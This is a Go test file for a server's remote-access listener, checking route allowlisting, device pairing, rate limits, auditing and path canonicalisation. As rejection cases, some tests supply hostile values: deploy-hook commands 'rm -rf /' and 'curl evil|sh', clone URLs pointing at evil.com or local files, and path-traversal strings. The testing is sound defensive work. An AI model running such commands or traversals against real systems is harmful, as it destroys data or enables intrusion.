package http

import (
	"bufio"
	"context"
	"encoding/json"
	"io"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/valyala/fasthttp"

	"github.com/makifbaysal/tasktrooper/server/internal/adapter/mcpserver"
	"github.com/makifbaysal/tasktrooper/server/internal/application/remoteaccess"
	"github.com/makifbaysal/tasktrooper/server/internal/application/remoteaccess/remotetest"
	"github.com/makifbaysal/tasktrooper/server/internal/domain"
)

type remoteHarness struct {
	t       *testing.T
	h       *Handler
	svc     *remoteaccess.Service
	store   *remotetest.Store
	app     *fiber.App
	reached atomic.Int32
	lastKey atomic.Value
}

const localKey = "local-server-key"

func newRemoteHarness(t *testing.T) *remoteHarness {
	t.Helper()
	store := remotetest.New()
	svc := remoteaccess.New(store, "9.9.9")
	h := &Handler{legacyAPIKey: localKey, remoteSvc: svc}
	rh := &remoteHarness{t: t, h: h, svc: svc, store: store}
	rh.app = h.newRemoteApp(func(ctx *fasthttp.RequestCtx) {
		rh.reached.Add(1)
		ctx.SetStatusCode(200)
		ctx.SetBodyString(`{"ok":true}`)
	})
	return rh
}

func (rh *remoteHarness) pair(role remoteaccess.Role, days int) (token string, dev remoteaccess.Device) {
	rh.t.Helper()
	p, err := rh.svc.CreatePairing(context.Background(), role, days, "")
	require.NoError(rh.t, err)
	token, dev, err = rh.svc.Exchange(context.Background(), p.Code, "test phone", "ios")
	require.NoError(rh.t, err)
	return
}

func (rh *remoteHarness) do(method, path, token, body string) (int, string, map[string]string) {
	rh.t.Helper()
	req := httptest.NewRequest(method, path, strings.NewReader(body))
	if body != "" {
		req.Header.Set("Content-Type", "application/json")
	}
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	resp, err := rh.app.Test(req, 5000)
	require.NoError(rh.t, err)
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	hdr := map[string]string{}
	for k := range resp.Header {
		hdr[k] = resp.Header.Get(k)
	}
	return resp.StatusCode, string(b), hdr
}

func errCode(t *testing.T, body string) string {
	t.Helper()
	var out struct {
		Code string `json:"code"`
	}
	require.NoError(t, json.Unmarshal([]byte(body), &out), body)
	return out.Code
}

var routeLiteral = regexp.MustCompile(`\.(Get|Post|Put|Patch|Delete)\("(/[^"]*)"`)

func scanRegisteredRoutes(t *testing.T) map[string]bool {
	t.Helper()
	routes := map[string]bool{}
	dirs := []string{".", "../mcpserver"}
	for _, dir := range dirs {
		files, err := filepath.Glob(filepath.Join(dir, "*.go"))
		require.NoError(t, err)
		for _, f := range files {
			if strings.HasSuffix(f, "_test.go") {
				continue
			}
			src, err := os.ReadFile(f)
			require.NoError(t, err)
			for _, m := range routeLiteral.FindAllStringSubmatch(string(src), -1) {
				routes[strings.ToUpper(m[1])+" "+m[2]] = true
			}
		}
	}
	for _, extra := range []string{
		"POST " + githubWebhookPath, "GET " + MCPOAuthCallbackPath,
		"POST " + mcpserver.Path, "GET " + mcpserver.Path, "DELETE " + mcpserver.Path,
		"POST /v1/alerts/ingest/sometoken",
	} {
		routes[extra] = true
	}
	return routes
}

var paramSeg = regexp.MustCompile(`:[A-Za-z0-9_]+`)

func concretePath(pattern string) string {
	p := paramSeg.ReplaceAllString(pattern, "11111111-1111-4111-8111-111111111111")
	return strings.ReplaceAll(p, "*", "x")
}

func normalizePattern(p string) string { return paramSeg.ReplaceAllString(p, ":p") }

func TestRemoteAllowlistDeniesEveryOtherRegisteredRoute(t *testing.T) {
	rh := newRemoteHarness(t)
	token, _ := rh.pair(remoteaccess.RoleOperator, 0)
	routes := scanRegisteredRoutes(t)
	require.Greater(t, len(routes), 300, "the source scan must see the whole API or this test proves nothing")

	keys := make([]string, 0, len(routes))
	for k := range routes {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	allowedSeen := 0
	for _, k := range keys {
		method, pattern, _ := strings.Cut(k, " ")
		path := concretePath(pattern)
		before := rh.reached.Load()
		status, body, _ := rh.do(method, path, token, "{}")
		if rule, ok := matchRemoteRule(method, path); ok && !rule.Native {
			allowedSeen++
			assert.Equal(t, int32(1), rh.reached.Load()-before, "%s should be forwarded", k)
			assert.Equal(t, 200, status, k)
			continue
		}
		assert.Equal(t, int32(0), rh.reached.Load()-before, "%s must not reach the local API", k)
		assert.Equal(t, 403, status, "%s: %s", k, body)
		assert.Equal(t, "route_not_allowed", errCode(t, body), k)
	}
	assert.Greater(t, allowedSeen, 30)
}

func TestEveryForwardedRuleIsARealRegisteredRoute(t *testing.T) {
	routes := scanRegisteredRoutes(t)
	normalized := map[string]bool{}
	for k := range routes {
		method, pattern, _ := strings.Cut(k, " ")
		normalized[method+" "+normalizePattern(pattern)] = true
	}
	for _, r := range remoteRules {
		if r.Native {
			continue
		}
		assert.True(t, normalized[r.Method+" "+normalizePattern(r.Pattern)], "allowlisted but not registered: %s %s", r.Method, r.Pattern)
	}
}

func TestSensitiveLocalRoutesAreNeverAllowlisted(t *testing.T) {
	forbidden := []string{
		"/admin/reload", "/admin/api-keys", "/v1/settings/mobile-devices", "/v1/mcp/servers", "/mcp",
		"/v1/remote-access", "/v1/remote-access/devices", "/v1/remote-access/pairings", "/v1/files",
		"/v1/settings", "/v1/llm/providers/anthropic/connect", "/v1/agent-cli/claude_code/connect",
		"/v1/settings/github/runner", "/metrics", "/docs", "/health", "/v1/chat/completions",
		"/v1/repositories/11111111-1111-4111-8111-111111111111/index",
		"/v1/sessions/11111111-1111-4111-8111-111111111111/project-root",
	}
	for _, p := range forbidden {
		for _, m := range []string{"GET", "POST", "PUT", "PATCH", "DELETE"} {
			_, ok := matchRemoteRule(m, p)
			assert.False(t, ok, "%s %s", m, p)
		}
	}
}

func TestRemoteInfoAndPairAreTheOnlyUnauthenticatedRoutes(t *testing.T) {
	rh := newRemoteHarness(t)
	status, body, hdr := rh.do("GET", "/remote/v1/info", "", "")
	require.Equal(t, 200, status)
	var info struct {
		Name         string   `json:"name"`
		Version      string   `json:"version"`
		Edition      string   `json:"edition"`
		APIVersion   int      `json:"api_version"`
		Capabilities []string `json:"capabilities"`
	}
	require.NoError(t, json.Unmarshal([]byte(body), &info))
	assert.Equal(t, "9.9.9", info.Version)
	assert.Equal(t, "local", info.Edition)
	assert.Equal(t, 1, info.APIVersion)
	assert.Contains(t, info.Capabilities, "chat_async")
	assert.Equal(t, "nosniff", hdr["X-Content-Type-Options"])

	for _, p := range []string{"/v1/tasks", "/remote/v1/me", "/admin/reload", "/", "/v1/remote-access", "/nonsense"} {
		status, body, hdr := rh.do("GET", p, "", "")
		assert.Equal(t, 401, status, p)
		assert.Equal(t, "unauthorized", errCode(t, body), p)
		assert.Equal(t, "Bearer", hdr["Www-Authenticate"])
	}
	assert.Equal(t, int32(0), rh.reached.Load())
}

func TestTheLocalAPIKeyIsNotAcceptedOnTheRemoteListener(t *testing.T) {
	rh := newRemoteHarness(t)
	status, body, _ := rh.do("GET", "/v1/tasks", localKey, "")
	assert.Equal(t, 401, status)
	assert.Equal(t, "unauthorized", errCode(t, body))
	assert.Equal(t, int32(0), rh.reached.Load())
}

func TestPairingOverHTTPAndRevocation(t *testing.T) {
	rh := newRemoteHarness(t)
	p, err := rh.svc.CreatePairing(context.Background(), remoteaccess.RoleOperator, 0, "")
	require.NoError(t, err)

	status, body, _ := rh.do("POST", "/remote/v1/pair", "", `{"code":"`+remoteaccess.DisplayCode(p.Code)+`","device_name":"Akif's iPhone","platform":"ios"}`)
	require.Equal(t, 200, status, body)
	var paired struct {
		Token    string `json:"token"`
		DeviceID string `json:"device_id"`
		Role     string `json:"role"`
	}
	require.NoError(t, json.Unmarshal([]byte(body), &paired))
	assert.True(t, strings.HasPrefix(paired.Token, "ttd_"))
	assert.Equal(t, "operator", paired.Role)

	status, _, _ = rh.do("POST", "/remote/v1/pair", "", `{"code":"`+p.Code+`","device_name":"again"}`)
	assert.Equal(t, 401, status, "a code is single use")

	status, body, _ = rh.do("GET", "/remote/v1/me", paired.Token, "")
	require.Equal(t, 200, status, body)
	assert.Contains(t, body, "Akif's iPhone")

	id, _ := uuid.Parse(paired.DeviceID)
	require.NoError(t, rh.svc.Revoke(context.Background(), id))
	status, body, _ = rh.do("GET", "/v1/tasks", paired.Token, "")
	assert.Equal(t, 401, status)
	assert.Equal(t, "token_revoked", errCode(t, body))
}

func TestPairingErrors(t *testing.T) {
	rh := newRemoteHarness(t)
	status, body, _ := rh.do("POST", "/remote/v1/pair", "", `{"code":"NOPENOPENOPE","device_name":"x"}`)
	assert.Equal(t, 401, status)
	assert.Equal(t, "invalid_pairing_code", errCode(t, body))

	status, body, _ = rh.do("POST", "/remote/v1/pair", "", `{"code":"","device_name":""}`)
	assert.Equal(t, 400, status)
	assert.Equal(t, "invalid_request", errCode(t, body))

	for i := 0; i < remoteaccess.PairFailuresPerMinute; i++ {
		rh.do("POST", "/remote/v1/pair", "", `{"code":"NOPENOPENOPE","device_name":"x"}`)
	}
	status, body, hdr := rh.do("POST", "/remote/v1/pair", "", `{"code":"NOPENOPENOPE","device_name":"x"}`)
	assert.Equal(t, 429, status)
	assert.Equal(t, "rate_limited", errCode(t, body))
	assert.NotEmpty(t, hdr["Retry-After"])
}

func TestExpiredDeviceTokenAnswersTokenExpired(t *testing.T) {
	rh := newRemoteHarness(t)
	token, dev := rh.pair(remoteaccess.RoleOperator, 1)
	past := time.Now().Add(-time.Hour)
	rh.store.Devices[dev.ID].ExpiresAt = &past
	status, body, _ := rh.do("GET", "/v1/tasks", token, "")
	assert.Equal(t, 401, status)
	assert.Equal(t, "token_expired", errCode(t, body))
}

func TestViewerCannotWrite(t *testing.T) {
	rh := newRemoteHarness(t)
	token, _ := rh.pair(remoteaccess.RoleViewer, 0)
	id := "11111111-1111-4111-8111-111111111111"

	status, _, _ := rh.do("GET", "/v1/tasks", token, "")
	assert.Equal(t, 200, status)

	for _, c := range [][2]string{
		{"POST", "/v1/repositories/" + id + "/tasks/" + id + "/comments"},
		{"PATCH", "/v1/repositories/" + id + "/tasks/" + id},
		{"POST", "/v1/sessions/" + id + "/messages"},
		{"POST", "/remote/v1/sessions/" + id + "/messages"},
		{"DELETE", "/v1/repositories/" + id},
	} {
		status, body, _ := rh.do(c[0], c[1], token, `{"content":"x"}`)
		assert.Equal(t, 403, status, c)
		assert.Equal(t, "read_only_device", errCode(t, body), c)
	}
	assert.Equal(t, int32(1), rh.reached.Load(), "only the read got through")

	status, _, _ = rh.do("DELETE", "/remote/v1/me", token, "")
	assert.Equal(t, 204, status, "a viewer may unpair itself")
}

func TestBodyRestrictions(t *testing.T) {
	rh := newRemoteHarness(t)
	token, _ := rh.pair(remoteaccess.RoleOperator, 0)
	id := "11111111-1111-4111-8111-111111111111"
	task := "/v1/repositories/" + id + "/tasks/" + id

	status, _, _ := rh.do("PATCH", task, token, `{"column":"todo","assignee_agent_id":null}`)
	assert.Equal(t, 200, status)

	for _, body := range []string{`{"before_deploy":"rm -rf /"}`, `{"column":"todo","after_deploy":"x"}`, `{"rollback_plan":"x"}`, `[1]`} {
		status, resp, _ := rh.do("PATCH", task, token, body)
		assert.Equal(t, 403, status, body)
		assert.Equal(t, "field_not_allowed", errCode(t, resp), body)
	}

	status, resp, _ := rh.do("POST", "/v1/repositories/"+id+"/tasks", token, `{"title":"x","before_deploy":"curl evil|sh"}`)
	assert.Equal(t, 403, status)
	assert.Equal(t, "field_not_allowed", errCode(t, resp))

	msg := "/v1/sessions/" + id + "/messages"
	status, _, _ = rh.do("POST", msg, token, `{"content":"hi","role":"user"}`)
	assert.Equal(t, 200, status)
	status, _, _ = rh.do("POST", msg, token, `{"content":"hi"}`)
	assert.Equal(t, 200, status)
	for _, role := range []string{"system", "assistant", "tool"} {
		status, resp, _ := rh.do("POST", msg, token, `{"content":"hi","role":"`+role+`"}`)
		assert.Equal(t, 403, status, role)
		assert.Equal(t, "field_not_allowed", errCode(t, resp))
	}

	status, _, _ = rh.do("POST", "/v1/repositories/import", token, `{"owner":"o","name":"n","clone_url":"https://github.com/o/n.git"}`)
	assert.Equal(t, 200, status)
	for _, u := range []string{"file:///etc", "git@evil.com:o/n.git", "https://evil.com/o/n.git", "ssh://github.com/o/n", "/Users/me/secret"} {
		status, _, _ := rh.do("POST", "/v1/repositories/import", token, `{"owner":"o","name":"n","clone_url":"`+u+`"}`)
		assert.Equal(t, 403, status, u)
	}
}

func TestNonCanonicalPathsAreRefused(t *testing.T) {
	rh := newRemoteHarness(t)
	token, _ := rh.pair(remoteaccess.RoleOperator, 0)
	for _, p := range []string{
		"/v1/tasks/", "/V1/tasks", "/v1//tasks", "/v1/./tasks", "/v1/projects/overview/../../admin/reload",
		"/v1/tasks%2flookup", "/v1/%74asks", "/v1/tasks;x=1", "/v1/projects/11111111-1111-4111-8111-11111111111Z",
		"/v1/projects/overview/", "/admin/agents/%2e%2e/reload",
	} {
		before := rh.reached.Load()
		status, _, _ := rh.do("GET", p, token, "")
		assert.Contains(t, []int{403, 404}, status, p)
		assert.Equal(t, before, rh.reached.Load(), p)
	}
	status, _, _ := rh.do("HEAD", "/v1/tasks", token, "")
	assert.Equal(t, 403, status, "HEAD is not part of the API")
	status, _, _ = rh.do("OPTIONS", "/v1/tasks", token, "")
	assert.Equal(t, 403, status)
}

func TestLiteralSiblingsOfAParameterAreNotReachableThroughIt(t *testing.T) {
	_, ok := matchRemoteRule("GET", "/v1/projects/map")
	assert.False(t, ok, "/v1/projects/map is a different route from /v1/projects/:projectId")
	_, ok = matchRemoteRule("GET", "/v1/tasks/released")
	assert.False(t, ok)
	_, ok = matchRemoteRule("GET", "/v1/projects/overview")
	assert.True(t, ok)
}

func TestWritesAreAuditedAndReadsAreNot(t *testing.T) {
	rh := newRemoteHarness(t)
	token, dev := rh.pair(remoteaccess.RoleOperator, 0)
	id := "11111111-1111-4111-8111-111111111111"
	rh.do("GET", "/v1/tasks", token, "")
	rh.do("POST", "/v1/repositories/"+id+"/tasks/"+id+"/comments", token, `{"content":"secret text"}`)
	rh.do("GET", "/v1/remote-access/devices", token, "")

	var requests []remoteaccess.AuditEntry
	for _, e := range rh.store.Audit {
		if e.Kind == remoteaccess.AuditRequest {
			requests = append(requests, e)
		}
	}
	require.Len(t, requests, 2)
	assert.Equal(t, "POST", requests[0].Method)
	assert.Equal(t, "/v1/repositories/:id/tasks/:taskId/comments", requests[0].Route, "route pattern, never the body or the ids")
	assert.Equal(t, 200, requests[0].Status)
	assert.Equal(t, dev.ID, *requests[0].DeviceID)
	assert.Equal(t, "(not allowed)", requests[1].Route)
	assert.Equal(t, 403, requests[1].Status)
}

func TestFailedAuthIsAuditedAndEventuallyRateLimited(t *testing.T) {
	rh := newRemoteHarness(t)
	for i := 0; i < remoteaccess.AuthFailuresPerMinute; i++ {
		status, _, _ := rh.do("GET", "/v1/tasks", "ttd_"+strings.Repeat("x", 43), "")
		require.Equal(t, 401, status)
	}
	status, body, _ := rh.do("GET", "/v1/tasks", "ttd_"+strings.Repeat("x", 43), "")
	assert.Equal(t, 429, status)
	assert.Equal(t, "rate_limited", errCode(t, body))
	assert.Contains(t, rh.store.AuditKinds(), remoteaccess.AuditAuthFailed)
}

func TestPerDeviceRateLimitOverHTTP(t *testing.T) {
	rh := newRemoteHarness(t)
	token, _ := rh.pair(remoteaccess.RoleOperator, 0)
	for i := 0; i < remoteaccess.DeviceRequestsPerMinute; i++ {
		status, _, _ := rh.do("GET", "/v1/tasks", token, "")
		require.Equal(t, 200, status)
	}
	status, body, hdr := rh.do("GET", "/v1/tasks", token, "")
	assert.Equal(t, 429, status)
	assert.Equal(t, "rate_limited", errCode(t, body))
	assert.NotEmpty(t, hdr["Retry-After"])
}

func TestOversizedBodiesAreRefused(t *testing.T) {
	rh := newRemoteHarness(t)
	token, _ := rh.pair(remoteaccess.RoleOperator, 0)
	big := `{"content":"` + strings.Repeat("a", 2<<20) + `"}`
	req := httptest.NewRequest("POST", "/v1/sessions/11111111-1111-4111-8111-111111111111/messages", strings.NewReader(big))
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := rh.app.Test(req, 5000)
	if err == nil {
		assert.Equal(t, 413, resp.StatusCode)
	}
	assert.Equal(t, int32(0), rh.reached.Load())
}

// The forwarded request must be answered by the real local router and the real
// local auth: the device token is not the API key, and the bypass the listener
// grants exists only for requests that passed its own gate.
func TestForwardingUsesTheLocalRouterWithoutTheLocalKey(t *testing.T) {
	store := remotetest.New()
	svc := remoteaccess.New(store, "1")
	h := &Handler{legacyAPIKey: localKey, remoteSvc: svc}
	main := fiber.New(fiber.Config{CaseSensitive: true})
	main.Use(h.authMiddleware)
	var sawAuth, sawClient atomic.Value
	main.Get("/v1/projects", func(c *fiber.Ctx) error {
		sawAuth.Store(c.Get("Authorization"))
		name, _ := c.Locals("client_name").(string)
		sawClient.Store(name)
		return c.JSON(fiber.Map{"projects": []string{}})
	})
	main.Get("/admin/reload-secret", func(c *fiber.Ctx) error { return c.SendString("never") })
	h.mainApp = main
	remote := h.newRemoteApp(main.Handler())

	p, _ := svc.CreatePairing(context.Background(), remoteaccess.RoleOperator, 0, "")
	token, _, err := svc.Exchange(context.Background(), p.Code, "Akif's iPhone", "ios")
	require.NoError(t, err)

	get := func(app *fiber.App, path, bearer string) (int, string) {
		req := httptest.NewRequest("GET", path, nil)
		if bearer != "" {
			req.Header.Set("Authorization", "Bearer "+bearer)
		}
		resp, err := app.Test(req, 5000)
		require.NoError(t, err)
		b, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, string(b)
	}

	status, body := get(remote, "/v1/projects", token)
	assert.Equal(t, 200, status, body)
	assert.Contains(t, body, "projects")
	assert.Equal(t, "", sawAuth.Load(), "the device token is not passed on")
	assert.Equal(t, "remote:Akif's iPhone", sawClient.Load())

	status, _ = get(remote, "/admin/reload-secret", token)
	assert.Equal(t, 403, status)

	status, _ = get(main, "/v1/projects", token)
	assert.Equal(t, 401, status, "a device token means nothing to the local listener")
	status, _ = get(main, "/v1/projects", "")
	assert.Equal(t, 401, status)
	status, _ = get(main, "/v1/projects", localKey)
	assert.Equal(t, 200, status)
}

func TestListenerLifecycleServesOnLoopbackOnly(t *testing.T) {
	store := remotetest.New()
	h := &Handler{remoteSvc: remoteaccess.New(store, "1")}
	main := fiber.New()
	main.Get("/v1/projects", func(c *fiber.Ctx) error { return c.SendString("ok") })
	h.mainApp = main

	port, err := h.EnableRemote(0)
	require.NoError(t, err)
	assert.NotZero(t, port)
	again, err := h.EnableRemote(0)
	require.NoError(t, err)
	assert.Equal(t, port, again, "enable is idempotent")
	assert.Equal(t, port, h.remotePort())

	h.DisableRemote()
	assert.Zero(t, h.remotePort())
	_, err = h.EnableRemote(port)
	require.NoError(t, err)
	assert.Equal(t, port, h.remotePort(), "the preferred port is reused when free")
	h.DisableRemote()
}

type fakeBoardEvents struct{ events []domain.BoardEvent }

func (f *fakeBoardEvents) Create(context.Context, domain.BoardEvent) (domain.BoardEvent, error) {
	return domain.BoardEvent{}, nil
}
func (f *fakeBoardEvents) ListRecent(_ context.Context, limit int) ([]domain.BoardEvent, error) {
	out := append([]domain.BoardEvent(nil), f.events...)
	sort.Slice(out, func(i, j int) bool { return out[i].CreatedAt.After(out[j].CreatedAt) })
	if len(out) > limit {
		out = out[:limit]
	}
	return out, nil
}
func (f *fakeBoardEvents) ListByTask(context.Context, uuid.UUID, int) ([]domain.BoardEvent, error) {
	return nil, nil
}

func TestChangesFeedCursor(t *testing.T) {
	rh := newRemoteHarness(t)
	t0 := time.Date(2026, 11, 11, 9, 0, 0, 0, time.UTC)
	events := &fakeBoardEvents{events: []domain.BoardEvent{
		{ID: uuid.New(), EventType: domain.BoardEventTaskCreated, CreatedAt: t0},
	}}
	rh.h.boardEvents = events
	token, _ := rh.pair(remoteaccess.RoleViewer, 0)

	status, body, _ := rh.do("GET", "/remote/v1/changes", token, "")
	require.Equal(t, 200, status, body)
	var first struct {
		Cursor string            `json:"cursor"`
		Events []json.RawMessage `json:"events"`
	}
	require.NoError(t, json.Unmarshal([]byte(body), &first))
	assert.Empty(t, first.Events)
	assert.Equal(t, t0.Format(time.RFC3339Nano), first.Cursor)

	status, body, _ = rh.do("GET", "/remote/v1/changes?since="+first.Cursor, token, "")
	require.Equal(t, 200, status)
	assert.Contains(t, body, `"events":[]`)

	events.events = append(events.events, domain.BoardEvent{ID: uuid.New(), EventType: domain.BoardEventTaskMoved, CreatedAt: t0.Add(time.Minute)})
	status, body, _ = rh.do("GET", "/remote/v1/changes?since="+first.Cursor, token, "")
	require.Equal(t, 200, status)
	assert.Contains(t, body, "task.moved")
	assert.NotContains(t, body, "task.created")
	assert.Contains(t, body, t0.Add(time.Minute).Format(time.RFC3339Nano))

	status, _, _ = rh.do("GET", "/remote/v1/changes?since=garbage", token, "")
	assert.Equal(t, 400, status)
}

func TestChangesLongPollReturnsWhenSomethingHappens(t *testing.T) {
	rh := newRemoteHarness(t)
	t0 := time.Now().UTC().Add(-time.Hour)
	events := &fakeBoardEvents{events: []domain.BoardEvent{{ID: uuid.New(), EventType: domain.BoardEventTaskCreated, CreatedAt: t0}}}
	rh.h.boardEvents = events
	token, _ := rh.pair(remoteaccess.RoleViewer, 0)

	go func() {
		time.Sleep(700 * time.Millisecond)
		events.events = append(events.events, domain.BoardEvent{ID: uuid.New(), EventType: domain.BoardEventTaskCommented, CreatedAt: time.Now().UTC()})
	}()
	start := time.Now()
	status, body, _ := rh.do("GET", "/remote/v1/changes?wait=10&since="+t0.Format(time.RFC3339Nano), token, "")
	require.Equal(t, 200, status)
	assert.Contains(t, body, "task.commented")
	assert.Less(t, time.Since(start), 5*time.Second)
}

func TestPairingURI(t *testing.T) {
	uri := BuildPairingURI("https://calm-fox-12.trycloudflare.com/", "K7QD2M9WXH4T", "Akif's MacBook")
	assert.Equal(t, "tasktrooper://pair?c=K7QD2M9WXH4T&n=Akif%27s%20MacBook&u=https%3A%2F%2Fcalm-fox-12.trycloudflare.com&v=1", uri)
}

func TestManagementRoutesNeedTheLocalKeyAndAreNotOnTheRemoteListener(t *testing.T) {
	store := remotetest.New()
	svc := remoteaccess.New(store, "1")
	h := &Handler{legacyAPIKey: localKey, remoteSvc: svc}
	app := fiber.New(fiber.Config{CaseSensitive: true})
	app.Use(h.authMiddleware)
	h.mainApp = app
	h.registerRemoteAccessRoutes(app)

	do := func(method, path, key, body string) (int, string) {
		req := httptest.NewRequest(method, path, strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		if key != "" {
			req.Header.Set("Authorization", "Bearer "+key)
		}
		resp, err := app.Test(req, 5000)
		require.NoError(t, err)
		b, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, string(b)
	}

	status, _ := do("GET", "/v1/remote-access", "", "")
	assert.Equal(t, 401, status)

	status, body := do("POST", "/v1/remote-access/pairings", localKey, `{"role":"operator","public_url":"https://x.example.com"}`)
	assert.Equal(t, 409, status, "pairing needs the listener on: "+body)

	status, body = do("POST", "/v1/remote-access/enable", localKey, `{}`)
	require.Equal(t, 200, status, body)
	defer h.DisableRemote()
	assert.Contains(t, body, `"enabled":true`)

	status, body = do("POST", "/v1/remote-access/pairings", localKey, `{"role":"operator","expires_in_days":7,"public_url":"https://x.example.com"}`)
	require.Equal(t, 201, status, body)
	var pairing struct {
		Code        string `json:"code"`
		CodeDisplay string `json:"code_display"`
		URI         string `json:"uri"`
	}
	require.NoError(t, json.Unmarshal([]byte(body), &pairing))
	assert.Len(t, pairing.Code, 12)
	assert.Contains(t, pairing.CodeDisplay, "-")
	assert.Contains(t, pairing.URI, "tasktrooper://pair?")
	assert.Contains(t, pairing.URI, pairing.Code)

	status, _ = do("POST", "/v1/remote-access/pairings", localKey, `{"role":"root","public_url":"https://x.example.com"}`)
	assert.Equal(t, 400, status)
	status, _ = do("POST", "/v1/remote-access/pairings", localKey, `{"role":"operator","public_url":"ftp://x"}`)
	assert.Equal(t, 400, status)

	_, dev, err := svc.Exchange(context.Background(), pairing.Code, "phone", "ios")
	require.NoError(t, err)
	status, body = do("GET", "/v1/remote-access/devices", localKey, "")
	assert.Equal(t, 200, status)
	assert.Contains(t, body, dev.ID.String())
	assert.NotContains(t, body, "token")

	status, _ = do("PATCH", "/v1/remote-access/devices/"+dev.ID.String(), localKey, `{"role":"viewer"}`)
	assert.Equal(t, 200, status)
	assert.Equal(t, remoteaccess.RoleViewer, store.Devices[dev.ID].Role)

	status, _ = do("DELETE", "/v1/remote-access/devices/"+dev.ID.String(), localKey, "")
	assert.Equal(t, 204, status)
	status, body = do("GET", "/v1/remote-access/audit?limit=10", localKey, "")
	assert.Equal(t, 200, status)
	assert.Contains(t, body, `"kind":"revoke"`)
	assert.Contains(t, body, `"kind":"pair"`)
}

func TestStreamedResponsesPassThroughTheListener(t *testing.T) {
	store := remotetest.New()
	svc := remoteaccess.New(store, "1")
	h := &Handler{legacyAPIKey: localKey, remoteSvc: svc}
	main := fiber.New(fiber.Config{CaseSensitive: true})
	main.Use(h.authMiddleware)
	main.Post("/v1/sessions/:id/messages", func(c *fiber.Ctx) error {
		c.Set("Content-Type", "text/event-stream")
		c.Context().SetBodyStreamWriter(fasthttp.StreamWriter(func(w *bufio.Writer) {
			for _, f := range []string{"data: one\n\n", "data: two\n\n", "data: [DONE]\n\n"} {
				_, _ = w.WriteString(f)
				_ = w.Flush()
			}
		}))
		return nil
	})
	h.mainApp = main
	remote := h.newRemoteApp(main.Handler())
	p, _ := svc.CreatePairing(context.Background(), remoteaccess.RoleOperator, 0, "")
	token, _, _ := svc.Exchange(context.Background(), p.Code, "phone", "ios")

	req := httptest.NewRequest("POST", "/v1/sessions/11111111-1111-4111-8111-111111111111/messages", strings.NewReader(`{"content":"hi","stream":true}`))
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := remote.Test(req, 5000)
	require.NoError(t, err)
	b, _ := io.ReadAll(resp.Body)
	assert.Equal(t, "text/event-stream", resp.Header.Get("Content-Type"))
	assert.Equal(t, "data: one\n\ndata: two\n\ndata: [DONE]\n\n", string(b))
}
